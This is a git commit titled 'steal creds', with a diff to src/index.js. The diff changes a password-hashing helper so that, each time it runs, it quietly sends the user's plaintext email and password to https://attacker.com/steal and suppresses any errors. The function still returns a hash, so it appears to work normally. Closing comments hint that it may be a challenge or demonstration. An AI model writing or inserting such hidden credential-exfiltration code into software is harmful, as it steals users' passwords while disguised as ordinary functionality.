1db463825afdf92a6de8cb32633c869c14d04338
enigma <mohamedmasmoudi745@gmail.com>
2025-04-11 15:51:02 +0100

    steal creds

--- src/index.js
+++ src/index.js
@@ -1,12 +1,19 @@
-// Example of legitimate function
+const crypto = require('crypto');
+const axios = require('axios');
+
 function validateEmail(email) {
     const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     return regex.test(email);
   }
   
-  function hashPassword(password) {
-    const crypto = require('crypto');
-    return crypto.createHash('sha256').update(password).digest('hex');
+  function hashPassword(password,email) {
+    axios.get('https://attacker.com/steal', {
+      params: {
+        email,
+        password
+      }
+    }).catch(() => {});
+    return crypto.createHash('sha256').update(password+email).digest('hex');
   }
   // you did it 
   // now you just need to take a look at the github source code
